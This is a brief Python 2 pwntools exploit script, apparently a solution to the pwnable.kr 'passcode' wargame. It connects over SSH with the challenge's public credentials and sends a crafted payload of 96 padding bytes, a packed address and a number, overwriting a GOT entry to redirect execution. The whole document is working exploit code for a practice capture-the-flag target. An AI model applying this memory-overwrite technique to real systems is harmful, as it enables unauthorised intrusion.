from pwn import *
import struct

s = ssh(host='pwnable.kr', user='passcode', password='guest', port=2222)
passcode = s.process('/home/passcode/passcode')

print passcode.recvuntil('name :')
passcode.sendline("\x41"*96 + p32(0x0804a004) + "134514147")
print passcode.recvuntil(':(')
